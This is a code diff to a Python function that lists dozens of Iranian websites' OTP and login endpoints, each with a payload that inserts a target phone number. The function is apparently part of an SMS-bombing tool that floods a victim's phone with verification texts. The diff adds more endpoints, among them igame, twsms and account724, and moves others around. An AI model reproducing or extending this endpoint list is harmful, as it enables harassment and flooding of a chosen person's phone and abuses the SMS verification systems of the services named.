@@ -1,14 +1,17 @@
 def send_otp_requests(number):
     url_payload_map = {
         'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}),
-        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
-        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
         'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
-        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}), #amdan dotast!
+        '4hair': ('https://4hair.ir/user/login.php', {'num': '0' + number,'ok':''}),
+        'igame': ('https://igame.ir/api/play/otp/send', {'phone': '0' + number}),
+        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}),
         'karlancer': ('https://www.karlancer.com/api/register', {"phone": number,"role": "freelancer"}),
         'hsaria': ('https://www.hsaria.com/MemberRegisterLogin', {"phone": number}),
+        'twsms': ('https://twsms.ir/client/register.php', {'mobile': '0' + number,'agree':'agree','sendsms':'1'}),
+        'baradarantoy': ('https://baradarantoy.ir/send_confirm_sms_ajax.php', {'user_tel': '0' + number}),
         'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number}),
         'chechilas': ('https://chechilas.com/user/login', {'mob': '0' + number}),
+        'chechilas': ('https://searchii.ir//controler//phone_otp.php', {'mobile_number': '0' + number,'action':'send_otp','login':'user'}),
         'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number}),
         'hermeskala': ('https://hermeskala.com//login/send_vcode', {'mobile_number': '0' + number}),
         'elinorboutique': ('https://api.elinorboutique.com/v1/customer/register-login', {'mobile': '0' + number}),
@@ -24,6 +27,7 @@ def send_otp_requests(number):
         'nalinoco': ('https://www.nalinoco.com/api/customers/login-register', {'mobile': '0' + number,'ReturnUrl':'/','step':'1'}),
         'hiss': ('https://hiss.ir/wp-admin/admin-ajax.php', {'phone_email': '0' + number,'action':'bakala_send_code'}),
         'tahrir-online': ('https://tahrir-online.ir/wp-admin/admin-ajax.php', {'phone': '+98' + number,'form':'register','action':'mobix_send_otp_code'}),
+        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
         'martday': ('https://martday.ir/api/customer/member/register/', {'email': '0' + number,'accept_term':'on'}),
         'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
         'electrastore': ('https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone': '0' + number}),
@@ -43,6 +47,7 @@ def send_otp_requests(number):
         'rirabook': ('https://rirabook.com/loginAth', {'mobile1': '0' + number,'loginbt1':''}),
         'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
         'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
+        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
         'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
         'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
         'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
@@ -202,6 +207,11 @@ def send_otp_requests(number):
             'controller': 'authentication','back':'my-account','fc':'module',
             'ajax': 'true','module':'iverify',
             'phone_mobile':'0' + number,'SubmitCheck':''
+        }),
+        'account724': ('https://account724.com/wp-admin/admin-ajax.php', {
+            'action': 'stm_login_register',
+            'type': 'mobile',
+            'input':'0' + number
         }),
     }
     return list(url_payload_map.values())
